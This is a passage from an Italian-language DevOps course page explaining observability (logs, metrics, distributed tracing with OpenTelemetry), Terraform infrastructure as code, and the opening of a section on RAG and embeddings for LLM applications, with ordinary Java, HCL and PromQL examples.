                    <p>Il <strong>monitoring</strong> è reattivo: definisci metriche e alert in anticipo per problemi noti. L'<strong>observability</strong> è esplorativa: ti permette di investigare problemi sconosciuti attraverso dati correlati. In sistemi distribuiti complessi, non puoi prevedere tutti i possibili failure mode, quindi hai bisogno di observability.</p>
                </div>

                <h3>I Tre Pilastri dell'Observability</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        OBSERVABILITY STACK                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌─────────────┐      ┌─────────────┐      ┌─────────────┐                │
│   │   LOGS      │      │   METRICS   │      │   TRACES    │                │
│   │             │      │             │      │             │                │
│   │  What       │      │  How much   │      │  Where      │                │
│   │  happened?  │      │  & how fast?│      │  & how long?│                │
│   └──────┬──────┘      └──────┬──────┘      └──────┬──────┘                │
│          │                    │                    │                        │
│          ▼                    ▼                    ▼                        │
│   ┌─────────────┐      ┌─────────────┐      ┌─────────────┐                │
│   │ Elasticsearch│      │ Prometheus  │      │   Jaeger    │                │
│   │ Loki        │      │ InfluxDB    │      │   Zipkin    │                │
│   │ Splunk      │      │ Datadog     │      │   Tempo     │                │
│   └─────────────┘      └─────────────┘      └─────────────┘                │
│                                                                              │
│                    ┌───────────────────────┐                                │
│                    │    OpenTelemetry      │                                │
│                    │  (Unified Collection) │                                │
│                    └───────────────────────┘                                │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>1. Logging: Il "Cosa è Successo"</h3>

                <p>I <strong>log</strong> sono record immutabili di eventi discreti che si verificano nel sistema. Ogni log entry cattura un momento specifico nel tempo con contesto dettagliato.</p>

                <h4>Structured Logging vs Unstructured Logging</h4>

                <p>Il <strong>structured logging</strong> produce log in formato machine-readable (JSON), rendendo possibile l'analisi automatizzata e le query complesse. È essenziale per sistemi distribuiti dove devi correlare eventi tra servizi diversi.</p>

                <pre><code class="language-java">// ❌ Unstructured Logging - difficile da parsare e analizzare
log.info("User " + userId + " placed order " + orderId + " for $" + amount);

// ✅ Structured Logging con SLF4J + Logback/Log4j2
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.MDC;

@Service
public class OrderService {
    private static final Logger log = LoggerFactory.getLogger(OrderService.class);

    public Order createOrder(String userId, OrderRequest request) {
        // MDC (Mapped Diagnostic Context) per contesto cross-cutting
        MDC.put("correlationId", UUID.randomUUID().toString());
        MDC.put("userId", userId);

        try {
            Order order = processOrder(request);

            // Structured logging con key-value pairs
            log.info("Order created successfully",
                kv("orderId", order.getId()),
                kv("amount", order.getTotalAmount()),
                kv("itemCount", order.getItems().size()),
                kv("paymentMethod", order.getPaymentMethod())
            );

            return order;
        } catch (InsufficientStockException e) {
            log.warn("Order creation failed due to stock",
                kv("orderId", request.getOrderId()),
                kv("failedItems", e.getFailedItems()),
                kv("reason", "insufficient_stock")
            );
            throw e;
        } finally {
            MDC.clear();
        }
    }
}</code></pre>

                <p>Il JSON risultante è facilmente indicizzabile e queryable:</p>

                <pre><code class="language-json">{
  "timestamp": "2026-01-28T10:15:30.123Z",
  "level": "INFO",
  "logger": "com.example.OrderService",
  "message": "Order created successfully",
  "correlationId": "abc-123-def-456",
  "userId": "user_789",
  "orderId": "ord_12345",
  "amount": 149.99,
  "itemCount": 3,
  "paymentMethod": "CREDIT_CARD",
  "service": "order-service",
  "environment": "production",
  "kubernetes": {
    "pod": "order-service-7d4b5c6-x2k9f",
    "namespace": "ecommerce"
  }
}</code></pre>

                <h4>Log Levels e Best Practices</h4>

                <table>
                    <thead>
                        <tr>
                            <th>Level</th>
                            <th>Quando Usare</th>
                            <th>Esempio</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>ERROR</code></td>
                            <td>Errori che richiedono intervento immediato</td>
                            <td>Database connection failed, Payment gateway timeout</td>
                        </tr>
                        <tr>
                            <td><code>WARN</code></td>
                            <td>Situazioni anomale ma gestite, degradazione</td>
                            <td>Retry succeeded, Cache miss rate high, Fallback activated</td>
                        </tr>
                        <tr>
                            <td><code>INFO</code></td>
                            <td>Eventi di business significativi</td>
                            <td>Order created, User registered, Payment processed</td>
                        </tr>
                        <tr>
                            <td><code>DEBUG</code></td>
                            <td>Dettagli utili per troubleshooting</td>
                            <td>Request/response payload, Cache hit, Query executed</td>
                        </tr>
                        <tr>
                            <td><code>TRACE</code></td>
                            <td>Dettagli molto granulari (raramente in prod)</td>
                            <td>Method entry/exit, Loop iterations</td>
                        </tr>
                    </tbody>
                </table>

                <h4>ELK Stack (Elasticsearch, Logstash, Kibana)</h4>

                <p>L'<strong>ELK Stack</strong> è la soluzione più diffusa per log aggregation e analysis:</p>

                <div class="diagram">
                    <pre>
┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   Services   │────▶│   Filebeat   │────▶│   Logstash   │────▶│Elasticsearch │
│   (Logs)     │     │   (Shipper)  │     │  (Transform) │     │   (Store)    │
└──────────────┘     └──────────────┘     └──────────────┘     └──────┬───────┘
                                                                       │
                                                                       ▼
                                                                ┌──────────────┐
                                                                │    Kibana    │
                                                                │ (Visualize)  │
                                                                └──────────────┘
                    </pre>
                </div>

                <ul>
                    <li><strong>Filebeat</strong>: Agent leggero che legge i log file e li invia a Logstash/Elasticsearch</li>
                    <li><strong>Logstash</strong>: Pipeline di processing per parsing, enrichment e transformation dei log</li>
                    <li><strong>Elasticsearch</strong>: Database distribuito ottimizzato per full-text search e analytics</li>
                    <li><strong>Kibana</strong>: UI per visualizzazione, dashboards e query dei log</li>
                </ul>

                <div class="info-box">
                    <h4>Alternativa: Grafana Loki</h4>
                    <p><strong>Loki</strong> è un'alternativa più leggera a Elasticsearch, sviluppata da Grafana Labs. A differenza di ELK che indicizza il contenuto completo dei log, Loki indicizza solo i metadati (labels) e comprime il testo dei log. Questo lo rende molto più economico in termini di storage e risorse, ideale per ambienti Kubernetes dove i log sono già etichettati con pod, namespace, etc.</p>
                </div>

                <h3>2. Metrics: Il "Quanto e Quanto Veloce"</h3>

                <p>Le <strong>metrics</strong> sono misurazioni numeriche aggregate nel tempo. A differenza dei log (eventi discreti), le metriche rappresentano valori che cambiano continuamente: CPU usage, request count, response time, error rate.</p>

                <h4>Tipi di Metriche</h4>

                <table>
                    <thead>
                        <tr>
                            <th>Tipo</th>
                            <th>Descrizione</th>
                            <th>Esempio</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>Counter</code></td>
                            <td>Valore che può solo aumentare (o reset a 0)</td>
                            <td>http_requests_total, errors_total</td>
                        </tr>
                        <tr>
                            <td><code>Gauge</code></td>
                            <td>Valore che può aumentare o diminuire</td>
                            <td>temperature, active_connections, queue_size</td>
                        </tr>
                        <tr>
                            <td><code>Histogram</code></td>
                            <td>Distribuzione di valori in bucket predefiniti</td>
                            <td>http_request_duration_seconds</td>
                        </tr>
                        <tr>
                            <td><code>Summary</code></td>
                            <td>Simile a Histogram ma calcola quantili client-side</td>
                            <td>request_latency (p50, p90, p99)</td>
                        </tr>
                    </tbody>
                </table>

                <h4>Prometheus e Spring Boot Actuator</h4>

                <pre><code class="language-java">// pom.xml dependencies
// spring-boot-starter-actuator
// micrometer-registry-prometheus

// application.yml
management:
  endpoints:
    web:
      exposure:
        include: health, metrics, prometheus
  metrics:
    tags:
      application: ${spring.application.name}
    distribution:
      percentiles-histogram:
        http.server.requests: true
      percentiles:
        http.server.requests: 0.5, 0.9, 0.95, 0.99</code></pre>

                <pre><code class="language-java">@Service
public class PaymentService {

    private final MeterRegistry meterRegistry;
    private final Counter paymentCounter;
    private final Timer paymentTimer;

    public PaymentService(MeterRegistry meterRegistry) {
        this.meterRegistry = meterRegistry;

        // Counter per contare i pagamenti per stato
        this.paymentCounter = Counter.builder("payments_total")
            .description("Total number of payment attempts")
            .tag("service", "payment-service")
            .register(meterRegistry);

        // Timer per misurare la latenza
        this.paymentTimer = Timer.builder("payment_processing_duration")
            .description("Time spent processing payments")
            .publishPercentiles(0.5, 0.95, 0.99)
            .register(meterRegistry);
    }

    public PaymentResult processPayment(PaymentRequest request) {
        return paymentTimer.record(() -> {
            try {
                PaymentResult result = gateway.charge(request);

                // Incrementa counter con tag dinamico
                meterRegistry.counter("payments_total",
                    "status", result.getStatus().name(),
                    "payment_method", request.getMethod().name()
                ).increment();

                return result;
            } catch (PaymentException e) {
                meterRegistry.counter("payments_total",
                    "status", "FAILED",
                    "error_type", e.getClass().getSimpleName()
                ).increment();
                throw e;
            }
        });
    }

    // Gauge per valori che cambiano
    @PostConstruct
    public void registerGauges() {
        Gauge.builder("payment_queue_size", paymentQueue, Queue::size)
            .description("Current size of payment processing queue")
            .register(meterRegistry);
    }
}</code></pre>

                <h4>PromQL: Querying Metrics</h4>

                <p><strong>PromQL</strong> è il linguaggio di query di Prometheus. Ecco alcune query comuni:</p>

                <pre><code class="language-yaml"># Request rate (richieste al secondo negli ultimi 5 minuti)
rate(http_requests_total[5m])

# Error rate percentuale
sum(rate(http_requests_total{status=~"5.."}[5m]))
/ sum(rate(http_requests_total[5m])) * 100

# 99th percentile latency
histogram_quantile(0.99,
  sum(rate(http_request_duration_seconds_bucket[5m])) by (le, service)
)

# Apdex score (Application Performance Index)
# Soddisfatti: < 300ms, Tolleranti: < 1.2s, Frustrati: > 1.2s
(
  sum(rate(http_request_duration_seconds_bucket{le="0.3"}[5m]))
  + sum(rate(http_request_duration_seconds_bucket{le="1.2"}[5m]))
) / 2 / sum(rate(http_request_duration_seconds_count[5m]))</code></pre>

                <h4>The Four Golden Signals (Google SRE)</h4>

                <p>Google SRE definisce quattro metriche fondamentali per monitorare qualsiasi servizio:</p>

                <table>
                    <thead>
                        <tr>
                            <th>Signal</th>
                            <th>Descrizione</th>
                            <th>Metrica Prometheus</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Latency</strong></td>
                            <td>Tempo per servire una richiesta</td>
                            <td><code>histogram_quantile(0.99, http_request_duration_seconds_bucket)</code></td>
                        </tr>
                        <tr>
                            <td><strong>Traffic</strong></td>
                            <td>Quante richieste stai ricevendo</td>
                            <td><code>rate(http_requests_total[5m])</code></td>
                        </tr>
                        <tr>
                            <td><strong>Errors</strong></td>
                            <td>Tasso di richieste fallite</td>
                            <td><code>rate(http_requests_total{status=~"5.."}[5m])</code></td>
                        </tr>
                        <tr>
                            <td><strong>Saturation</strong></td>
                            <td>Quanto è "pieno" il sistema</td>
                            <td><code>container_memory_usage_bytes / container_spec_memory_limit_bytes</code></td>
                        </tr>
                    </tbody>
                </table>

                <h3>3. Distributed Tracing: Il "Dove e Quanto Tempo"</h3>

                <p>In un sistema distribuito, una singola richiesta utente può attraversare decine di servizi. Il <strong>distributed tracing</strong> traccia il percorso completo di una richiesta attraverso tutti i servizi, permettendo di identificare colli di bottiglia e failure points.</p>

                <div class="diagram">
                    <pre>
Richiesta Utente: GET /api/orders/123
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Trace ID: abc-123-xyz
├── Span: API Gateway (12ms)
│   ├── Span: Auth Service - validate token (8ms)
│   │   └── Span: Redis - get session (2ms)
│   │
│   └── Span: Order Service - get order (45ms)
│       ├── Span: PostgreSQL - SELECT order (15ms)
│       │
│       ├── Span: User Service - get user details (18ms)  ← Chiamata HTTP
│       │   └── Span: PostgreSQL - SELECT user (5ms)
│       │
│       └── Span: Inventory Service - get stock (25ms)    ← Chiamata HTTP
│           └── Span: Redis - get stock cache (3ms)

Tempo Totale: 57ms (alcuni span sono paralleli)
                    </pre>
                </div>

                <h4>Concetti Fondamentali</h4>

                <ul>
                    <li><strong>Trace</strong>: Rappresenta il viaggio completo di una richiesta attraverso il sistema. Ha un ID unico.</li>
                    <li><strong>Span</strong>: Un singolo "pezzo" del trace, rappresenta un'operazione (chiamata HTTP, query DB, etc.). Ha ID, parent span ID, timing, tags.</li>
                    <li><strong>Context Propagation</strong>: Meccanismo per passare trace ID e span ID tra servizi (via HTTP headers o message metadata).</li>
                </ul>

                <h4>OpenTelemetry: Lo Standard Unificato</h4>

                <p><strong>OpenTelemetry</strong> (OTel) è lo standard CNCF che unifica la collezione di traces, metrics e logs. È il successore di OpenTracing e OpenCensus.</p>

                <pre><code class="language-java">// pom.xml - Spring Boot 3 con OpenTelemetry
// opentelemetry-spring-boot-starter
// opentelemetry-exporter-otlp

// application.yml
spring:
  application:
    name: order-service

otel:
  exporter:
    otlp:
      endpoint: http://otel-collector:4317
  resource:
    attributes:
      service.name: ${spring.application.name}
      deployment.environment: production
  instrumentation:
    spring-web:
      enabled: true
    jdbc:
      enabled: true</code></pre>

                <pre><code class="language-java">import io.opentelemetry.api.trace.Span;
import io.opentelemetry.api.trace.Tracer;
import io.opentelemetry.instrumentation.annotations.WithSpan;
import io.opentelemetry.instrumentation.annotations.SpanAttribute;

@Service
public class OrderService {

    private final Tracer tracer;

    public OrderService(Tracer tracer) {
        this.tracer = tracer;
    }

    // Auto-instrumentation con annotation
    @WithSpan("process-order")
    public Order processOrder(
            @SpanAttribute("order.id") String orderId,
            @SpanAttribute("user.id") String userId) {

        // Span automaticamente creato dalla annotation
        Span currentSpan = Span.current();

        // Aggiungere attributi dinamici
        currentSpan.setAttribute("order.total", calculateTotal());

        // Creare span figlio manualmente per operazioni custom
        Span inventorySpan = tracer.spanBuilder("check-inventory")
            .startSpan();

        try (var scope = inventorySpan.makeCurrent()) {
            inventorySpan.setAttribute("items.count", items.size());
            boolean available = checkInventory(items);
            inventorySpan.setAttribute("inventory.available", available);

            if (!available) {
                inventorySpan.setStatus(StatusCode.ERROR, "Insufficient stock");
                throw new InsufficientStockException();
            }
        } finally {
            inventorySpan.end();
        }

        return createOrder(orderId, userId);
    }

    // Propagazione automatica via RestTemplate/WebClient instrumentati
    public UserDetails fetchUserDetails(String userId) {
        // Il trace context viene propagato automaticamente via headers:
        // traceparent: 00-{trace-id}-{span-id}-01
        return restTemplate.getForObject(
            "http://user-service/users/{id}",
            UserDetails.class,
            userId
        );
    }
}</code></pre>

                <h4>Architettura OpenTelemetry</h4>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────┐
│                         APPLICATION SERVICES                             │
├─────────────┬─────────────┬─────────────┬─────────────┬─────────────────┤
│ Order Svc   │ User Svc    │ Payment Svc │ Inventory   │ Notification    │
│   (OTel     │   (OTel     │   (OTel     │   (OTel     │   (OTel         │
│    SDK)     │    SDK)     │    SDK)     │    SDK)     │    SDK)         │
└──────┬──────┴──────┬──────┴──────┬──────┴──────┬──────┴────────┬────────┘
       │             │             │             │               │
       └─────────────┴──────┬──────┴─────────────┴───────────────┘
                            │
                            ▼
                 ┌─────────────────────┐
                 │  OpenTelemetry      │
                 │  Collector          │
                 │  ┌───────────────┐  │
                 │  │ Receivers     │  │  ← OTLP, Jaeger, Zipkin
                 │  │ Processors    │  │  ← Batch, Filter, Sampling
                 │  │ Exporters     │  │  ← Multi-backend
                 │  └───────────────┘  │
                 └──────────┬──────────┘
                            │
         ┌──────────────────┼──────────────────┐
         │                  │                  │
         ▼                  ▼                  ▼
  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
  │   Jaeger    │    │   Grafana   │    │  Datadog/   │
  │   (Traces)  │    │   Tempo     │    │  New Relic  │
  └─────────────┘    └─────────────┘    └─────────────┘
                    </pre>
                </div>

                <div class="info-box success">
                    <h4>Sampling Strategies</h4>
                    <p>In produzione con alto traffico, tracciare il 100% delle richieste è costoso. Le strategie di sampling includono:</p>
                    <ul>
                        <li><strong>Head-based sampling</strong>: Decidi all'inizio del trace se campionare (es. 10% delle richieste)</li>
                        <li><strong>Tail-based sampling</strong>: Decidi alla fine del trace, utile per catturare sempre errori o latenze alte</li>
                        <li><strong>Adaptive sampling</strong>: Campiona di più quando c'è meno traffico, di meno durante i picchi</li>
                    </ul>
                </div>

                <h3>Correlazione tra i Tre Pilastri</h3>

                <p>Il vero potere dell'observability emerge quando correli logs, metrics e traces. Il <strong>trace ID</strong> è la chiave che permette di collegare tutto:</p>

                <pre><code class="language-java">// Il trace ID appare ovunque:

// 1. Nei LOG (via MDC/SLF4J integration)
{
  "message": "Payment failed",
  "traceId": "abc123",
  "spanId": "def456",
  "userId": "user_789"
}

// 2. Nelle METRICS (come exemplar)
http_request_duration_seconds{status="500"} 2.5 # {traceId="abc123"}

// 3. Nei TRACES (ovviamente)
Trace abc123 → Span def456 → "Payment Service - charge"</code></pre>

                <p>Con questa correlazione, il workflow di debugging diventa:</p>
                <ol>
                    <li><strong>Alert</strong>: Prometheus rileva un picco di errori 5xx</li>
                    <li><strong>Metrics</strong>: Dashboard Grafana mostra latenza alta sul payment-service</li>
                    <li><strong>Traces</strong>: Drill-down su un trace lento, vedi che il problema è nella chiamata al payment gateway</li>
                    <li><strong>Logs</strong>: Filtri per trace ID, trovi il log esatto dell'errore con lo stack trace</li>
                </ol>
            </section>

            <!-- Infrastructure as Code Section -->
            <section class="section" id="modulo6-terraform">
                <h2>Infrastructure as Code con Terraform</h2>

                <p>L'<strong>Infrastructure as Code</strong> (IaC) è la pratica di gestire e provisioning l'infrastruttura attraverso file di configurazione versionabili, invece di processi manuali. Terraform è lo strumento IaC più diffuso, con supporto multi-cloud.</p>

                <h3>Perché Infrastructure as Code?</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Approccio Manuale</th>
                            <th>Infrastructure as Code</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Click nella console AWS/GCP/Azure</td>
                            <td>File di configurazione versionati in Git</td>
                        </tr>
                        <tr>
                            <td>"Funziona sul mio account"</td>
                            <td>Ambienti riproducibili (dev = staging = prod)</td>
                        </tr>
                        <tr>
                            <td>Chi ha modificato cosa?</td>
                            <td>Git history + terraform plan per review</td>
                        </tr>
                        <tr>
                            <td>Disaster recovery: "ricostruisco tutto a mano"</td>
                            <td>terraform apply e l'infrastruttura rinasce</td>
                        </tr>
                        <tr>
                            <td>Documentazione obsoleta</td>
                            <td>Il codice È la documentazione</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Terraform: Concetti Fondamentali</h3>

                <h4>HCL (HashiCorp Configuration Language)</h4>

                <p>Terraform usa <strong>HCL</strong>, un linguaggio dichiarativo dove descrivi lo stato desiderato dell'infrastruttura, non i passi per arrivarci.</p>

                <pre><code class="language-yaml"># main.tf - Esempio base: VPC + EC2 su AWS

terraform {
  required_version = ">= 1.5.0"

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }

  # Backend remoto per lo state (collaborazione team)
  backend "s3" {
    bucket         = "my-terraform-state"
    key            = "prod/terraform.tfstate"
    region         = "eu-west-1"
    encrypt        = true
    dynamodb_table = "terraform-locks"  # State locking
  }
}

provider "aws" {
  region = var.aws_region

  default_tags {
    tags = {
      Environment = var.environment
      ManagedBy   = "terraform"
      Project     = var.project_name
    }
  }
}

# Variables
variable "aws_region" {
  description = "AWS region for resources"
  type        = string
  default     = "eu-west-1"
}

variable "environment" {
  description = "Environment name (dev, staging, prod)"
  type        = string
}

variable "instance_type" {
  description = "EC2 instance type"
  type        = string
  default     = "t3.micro"

  validation {
    condition     = contains(["t3.micro", "t3.small", "t3.medium"], var.instance_type)
    error_message = "Instance type must be t3.micro, t3.small, or t3.medium."
  }
}</code></pre>

                <h4>Resources e Data Sources</h4>

                <pre><code class="language-yaml"># VPC e Networking
resource "aws_vpc" "main" {
  cidr_block           = "10.0.0.0/16"
  enable_dns_hostnames = true
  enable_dns_support   = true

  tags = {
    Name = "${var.project_name}-vpc"
  }
}

resource "aws_subnet" "public" {
  count             = 2
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.0.${count.index + 1}.0/24"
  availability_zone = data.aws_availability_zones.available.names[count.index]

  map_public_ip_on_launch = true

  tags = {
    Name = "${var.project_name}-public-${count.index + 1}"
    Type = "public"
  }
}

# Data source: legge dati esistenti (non crea risorse)
data "aws_availability_zones" "available" {
  state = "available"
}

data "aws_ami" "amazon_linux" {
  most_recent = true
  owners      = ["amazon"]

  filter {
    name   = "name"
    values = ["amzn2-ami-hvm-*-x86_64-gp2"]
  }
}

# EC2 Instance
resource "aws_instance" "app" {
  ami                    = data.aws_ami.amazon_linux.id
  instance_type          = var.instance_type
  subnet_id              = aws_subnet.public[0].id
  vpc_security_group_ids = [aws_security_group.app.id]

  user_data = &lt;&lt;-EOF
    #!/bin/bash
    yum update -y
    yum install -y docker
    systemctl start docker
    systemctl enable docker
  EOF

  tags = {
    Name = "${var.project_name}-app-server"
  }

  lifecycle {
    create_before_destroy = true
  }
}

# Security Group
resource "aws_security_group" "app" {
  name        = "${var.project_name}-app-sg"
  description = "Security group for application servers"
  vpc_id      = aws_vpc.main.id

  ingress {
    description = "HTTP"
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    description = "HTTPS"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# Outputs
output "instance_public_ip" {
  description = "Public IP of the EC2 instance"
  value       = aws_instance.app.public_ip
}

output "vpc_id" {
  description = "ID of the VPC"
  value       = aws_vpc.main.id
}</code></pre>

                <h3>Terraform Workflow</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────┐
│                        TERRAFORM WORKFLOW                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. WRITE          2. PLAN           3. APPLY          4. DESTROY       │
│  ─────────         ────────          ─────────         ───────────      │
│                                                                          │
│  ┌─────────┐      ┌─────────┐       ┌─────────┐       ┌─────────┐      │
│  │ .tf     │ ───▶ │terraform│ ───▶  │terraform│ ───▶  │terraform│      │
│  │ files   │      │  plan   │       │  apply  │       │ destroy │      │
│  └─────────┘      └────┬────┘       └────┬────┘       └─────────┘      │
│                        │                 │                               │
│                        ▼                 ▼                               │
│                   ┌─────────┐       ┌─────────┐                         │
│                   │ Execution│       │  State  │                         │
│                   │   Plan   │       │  File   │                         │
│                   │(preview) │       │(.tfstate)│                        │
│                   └─────────┘       └─────────┘                         │
│                                                                          │
│  "Cosa voglio"   "Cosa cambierà"  "Applica"      "Distruggi tutto"     │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-bash"># Inizializza il working directory (scarica providers, configura backend)
terraform init

# Mostra cosa verrà creato/modificato/distrutto (DRY RUN)
terraform plan -out=tfplan

# Applica le modifiche (crea/modifica l'infrastruttura reale)
terraform apply tfplan

# Mostra lo stato corrente
terraform show

# Lista tutte le risorse gestite
terraform state list

# Distrugge TUTTA l'infrastruttura (ATTENZIONE!)
terraform destroy</code></pre>

                <h3>Terraform State: Il Cuore di Terraform</h3>

                <p>Il <strong>state file</strong> (<code>terraform.tfstate</code>) è il database di Terraform: mappa le risorse nel codice alle risorse reali nel cloud. Senza lo state, Terraform non saprebbe cosa esiste già e cosa deve creare.</p>

                <div class="info-box warning">
                    <h4>State File: Trattalo con Cura!</h4>
                    <ul>
                        <li><strong>Contiene secrets</strong>: password DB, chiavi API in plain text. MAI committarlo in Git!</li>
                        <li><strong>Remote backend obbligatorio per team</strong>: S3 + DynamoDB (locking), Terraform Cloud, GCS</li>
                        <li><strong>State locking</strong>: Previene modifiche concorrenti che corromperebbero lo state</li>
                        <li><strong>State backup</strong>: Abilita versioning sul bucket S3</li>
                    </ul>
                </div>

                <h3>Terraform Modules: Riusabilità</h3>

                <p>I <strong>modules</strong> sono container riusabili di risorse Terraform. Invece di copiare codice, crei un modulo e lo richiami con parametri diversi.</p>

                <pre><code class="language-yaml"># modules/vpc/main.tf
variable "cidr_block" {
  type = string
}

variable "environment" {
  type = string
}

resource "aws_vpc" "this" {
  cidr_block = var.cidr_block

  tags = {
    Name        = "${var.environment}-vpc"
    Environment = var.environment
  }
}

output "vpc_id" {
  value = aws_vpc.this.id
}

# ─────────────────────────────────────────────

# environments/prod/main.tf - Uso del modulo
module "vpc" {
  source = "../../modules/vpc"

  cidr_block  = "10.0.0.0/16"
  environment = "prod"
}

module "vpc_staging" {
  source = "../../modules/vpc"

  cidr_block  = "10.1.0.0/16"
  environment = "staging"
}

# Puoi anche usare moduli dalla Terraform Registry
module "eks" {
  source  = "terraform-aws-modules/eks/aws"
  version = "~> 19.0"

  cluster_name    = "my-cluster"
  cluster_version = "1.28"
  # ... altri parametri
}</code></pre>

                <h3>Best Practices Terraform</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Practice</th>
                            <th>Descrizione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Remote State</strong></td>
                            <td>Usa sempre un backend remoto (S3, GCS, Terraform Cloud) per collaborazione e locking</td>
                        </tr>
                        <tr>
                            <td><strong>State per Environment</strong></td>
                            <td>Separa lo state per ambiente (dev, staging, prod) per isolamento e blast radius ridotto</td>
                        </tr>
                        <tr>
                            <td><strong>Plan in CI/CD</strong></td>
                            <td>terraform plan automatico su ogni PR, apply solo dopo merge/approval</td>
                        </tr>
                        <tr>
                            <td><strong>Lock Versions</strong></td>
                            <td>Specifica versioni esatte di Terraform e providers nel required_providers</td>
                        </tr>
                        <tr>
                            <td><strong>Use Modules</strong></td>
                            <td>Non ripetere codice: crea moduli per pattern comuni (VPC, EKS, RDS)</td>
                        </tr>
                        <tr>
                            <td><strong>Validate & Format</strong></td>
                            <td>terraform validate e terraform fmt in pre-commit hooks</td>
                        </tr>
                    </tbody>
                </table>
            </section>

            <!-- LLM & AI Integration Section -->
            <section class="section" id="modulo6-ai">
                <h2>LLM & AI Integration nelle Applicazioni</h2>

                <p>L'integrazione di <strong>Large Language Models</strong> (LLM) nelle applicazioni enterprise è una delle competenze più richieste nel 2026. Questa sezione copre i pattern architetturali fondamentali: <strong>RAG</strong>, <strong>Vector Databases</strong> e <strong>Embeddings</strong>.</p>

                <h3>Il Problema: Limitazioni degli LLM</h3>

                <p>Gli LLM come GPT-4, Claude, Llama hanno limitazioni significative per applicazioni enterprise:</p>

                <table>
                    <thead>
                        <tr>
                            <th>Limitazione</th>
                            <th>Problema</th>
                            <th>Soluzione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Knowledge Cutoff</strong></td>
                            <td>Non conoscono eventi dopo il training</td>
                            <td>RAG con dati aggiornati</td>
                        </tr>
                        <tr>
                            <td><strong>No Private Data</strong></td>
                            <td>Non conoscono i tuoi documenti interni</td>
                            <td>RAG con knowledge base aziendale</td>
                        </tr>
                        <tr>
                            <td><strong>Hallucinations</strong></td>
                            <td>Inventano informazioni plausibili ma false</td>
                            <td>RAG + citazione fonti</td>
                        </tr>
                        <tr>
                            <td><strong>Context Window</strong></td>
                            <td>Limite di token per richiesta (es. 128K)</td>
                            <td>Retrieval selettivo dei chunk rilevanti</td>
                        </tr>
                    </tbody>
                </table>

                <h3>RAG: Retrieval Augmented Generation</h3>

                <p><strong>RAG</strong> è un pattern architetturale che combina la potenza generativa degli LLM con la precisione del retrieval da una knowledge base. Invece di fare fine-tuning (costoso, lento), "aumenti" il prompt con contesto rilevante recuperato al momento.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                          RAG ARCHITECTURE                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─────────────────────────────── INDEXING PIPELINE ───────────────────────┐│
│  │                                                                          ││
│  │  Documents    ──▶   Chunking    ──▶   Embedding   ──▶   Vector DB       ││
│  │  (PDF, HTML,       (Split into       Model            (Store vectors    ││
│  │   Markdown)         ~512 tokens)     (ada-002,         + metadata)      ││
│  │                                       all-MiniLM)                        ││
│  └──────────────────────────────────────────────────────────────────────────┘│
│                                                                              │
│  ┌─────────────────────────────── QUERY PIPELINE ──────────────────────────┐│
│  │                                                                          ││
│  │  User Query ─┬──▶ Embed Query ──▶ Similarity  ──▶ Top-K    ──▶ Prompt  ││
│  │              │                     Search         Chunks       Builder  ││
│  │              │                     (Vector DB)                          ││
│  │              │                                                          ││
│  │              │    ┌─────────────────────────────────────────────────┐   ││
│  │              │    │  AUGMENTED PROMPT                               │   ││
│  │              │    │  ─────────────────                               │   ││
│  │              │    │  Context:                                        │   ││
│  │              │    │  [Chunk 1: "La policy aziendale prevede..."]     │   ││
│  │              │    │  [Chunk 2: "Il processo di rimborso..."]         │   ││
│  │              │    │                                                  │   ││
│  │              └───▶│  Question: "Come richiedo un rimborso?"          │   ││
│  │                   │                                                  │   ││
│  │                   │  Instructions: Rispondi basandoti solo sul      │   ││
│  │                   │  contesto fornito. Cita le fonti.               │   ││
│  │                   └────────────────────────┬────────────────────────┘   ││
│  │                                            │                            ││
│  │                                            ▼                            ││
│  │                                    ┌──────────────┐                     ││
│  │                                    │     LLM      │                     ││
│  │                                    │  (GPT-4,     │                     ││
│  │                                    │   Claude)    │                     ││
│  │                                    └──────┬───────┘                     ││
│  │                                           │                             ││
│  │                                           ▼                             ││
│  │                                    Response with                        ││
│  │                                    citations                            ││
│  └──────────────────────────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h4>Embeddings: Il Cuore Semantico</h4>

                <p>Gli <strong>embeddings</strong> sono rappresentazioni numeriche (vettori) del significato semantico del testo. Testi con significato simile hanno vettori "vicini" nello spazio multidimensionale.</p>

                <pre><code class="language-java">// Esempio concettuale di embeddings
"Come richiedere un rimborso?"  → [0.12, -0.34, 0.87, ..., 0.23]  // 1536 dimensioni
